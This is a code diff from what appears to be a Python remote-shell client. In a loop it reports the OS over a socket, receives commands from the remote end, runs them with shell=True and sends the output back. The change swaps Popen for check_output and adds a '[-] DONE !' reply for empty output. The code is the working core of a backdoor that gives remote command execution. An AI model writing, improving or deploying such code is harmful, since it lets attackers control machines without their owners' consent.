@@ -11,10 +11,14 @@ while True:
     encoded_oser = oser.encode('utf-8')
     s.sendall(encoded_oser)
     data = (s.recv(1024)).decode('utf-8')
-    shell_data = subprocess.Popen(data,shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    cmd = subprocess.check_output(data,shell=True)
 
-    value_shell = shell_data.stdout.read()+shell_data.stderr.read()
-
-    s.sendall(value_shell)
+    if cmd == ''.encode('utf-8'):
+        
+        s.sendall("[-] DONE !".encode('utf-8'))
+        continue
+    
+    s.sendall(cmd)
+        
 
 s.close()
